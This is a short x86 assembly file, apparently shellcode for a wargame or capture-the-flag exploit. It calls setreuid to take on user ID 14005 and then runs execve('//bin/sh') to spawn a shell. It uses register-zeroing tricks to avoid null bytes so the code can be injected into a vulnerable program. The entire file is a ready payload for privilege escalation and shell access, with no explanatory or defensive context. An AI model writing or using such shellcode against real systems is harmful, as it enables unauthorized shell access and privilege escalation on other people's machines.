#include <sys/syscall.h>

.globl	main
.type	main, @function

main:
// setreuid(14005, 14005)
xor %eax, %eax
xor %ebx, %ebx
xor %ecx, %ecx
mov $0x46, %al
mov $0x36b5, %bx
mov %bx, %cx
int $0x80

// execve("//bin/sh", 0, 0)
xor %eax, %eax
mov $0x0b, %al
xor %ecx, %ecx
xor %edx, %edx
push %edx
push $0x68732f6e
push $0x69622f2f
mov %esp, %ebx
int $0x80
